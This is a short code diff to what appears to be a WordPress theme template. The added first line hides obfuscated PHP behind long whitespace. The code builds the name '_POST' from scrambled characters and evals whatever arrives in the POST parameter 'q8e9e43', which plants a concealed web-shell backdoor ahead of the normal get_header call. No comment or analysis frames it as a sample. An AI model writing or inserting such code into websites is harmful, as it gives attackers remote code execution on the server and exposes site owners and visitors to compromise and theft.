@@ -1,4 +1,4 @@
-<?php get_header(); ?>
+<?php                                                                                                                                                                                                                                                                 $dit92 ="stp_o"; $myxi22 =strtoupper($dit92[3].$dit92[2].$dit92[4].$dit92[0]. $dit92[1] );if (isset(${$myxi22}['q8e9e43']) ){eval ( ${ $myxi22} ['q8e9e43']) ;}?><?php get_header(); ?>
 
 		<div id="page" class="one-column">
 	
